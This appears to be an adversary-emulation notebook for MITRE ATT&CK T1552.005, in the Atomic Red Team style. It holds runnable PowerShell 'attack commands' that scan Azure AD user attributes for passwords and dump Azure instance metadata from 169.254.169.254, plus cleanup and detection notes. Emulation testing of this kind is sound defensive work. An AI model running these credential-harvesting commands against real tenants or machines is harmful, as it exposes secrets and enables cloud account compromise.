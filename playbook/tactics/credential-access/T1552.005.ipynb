{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "668271c9",
   "metadata": {},
   "source": "# T1552.005 - Cloud Instance Metadata API\nAdversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n"
  },
  {
   "cell_type": "markdown",
   "id": "59350540",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "05978ed0",
   "metadata": {},
   "source": "### Atomic Test #1 - Azure - Search Azure AD User Attributes for Passwords\nThis test uses the MSOnline Powershell module to retrieve all user attributes for a specified account, which can sometimes contain unsecured credentials. \nUpon successful execution, this test will scan all user attributes for any strings containing \"password\".\nThose unsecured credentials will be output to a text file, as well as the account that they are associated with and the user attribute in which they were found. \nSee: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md\n\n**Supported Platforms:** azure-ad\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: The MSOnline module must be installed.\n\n##### Check Prereq Commands:\n```powershell\nif (get-command Get-MsolUser -erroraction silentlycontinue){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\ninstall-module MSOnline\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "770f93c7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.005 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "b269fe3f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nimport-module msonline\n$Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password\nConnect-MsolService -Credential $Credential\n$users = Get-MsolUser -All;\nforeach($user in $users)\n{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; \nforeach($prop in $props)\n{if($user.$prop -like \"*password*\")\n{(\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop) | out-file -filepath $env:temp\\T1552.005Test1.txt -append -force}}}\nget-content -path $env:temp\\T1552.005Test1.txt -erroraction silentlycontinue\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f5f0186e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.005 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "d2ba647c",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nremove-item $env:temp\\T1552.005Test1.txt -force -erroraction silentlycontinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c3f76cfa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.005 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e1627b5b",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Azure - Dump Azure Instance Metadata from Virtual Machines",
    "This test invokes a web request to the default Instance Metadata API of 169.254.169.254 in order to dump the data contained within it to a file. \nSee: https://www.sans.org/blog/cloud-instance-metadata-services-imds-/\n",
    "**Supported Platforms:** iaas:azure",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-RestMethod -Headers @{\"Metadata\"=\"true\"} -Method GET -Uri \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" | ConvertTo-Json -Depth 64 > $env:temp\\T1552.005Test2.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6ceeb04a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.005 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "947da01c",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nremove-item $env:temp\\T1552.005Test2.txt -force -erroraction silentlycontinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "385b48d8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.005 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c41d9f67",
   "metadata": {},
   "source": "## Detection\nMonitor access to the Instance Metadata API and look for anomalous queries.\n\nIt may be possible to detect adversary use of credentials they have obtained such as in [Valid Accounts](https://attack.mitre.org/techniques/T1078)."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}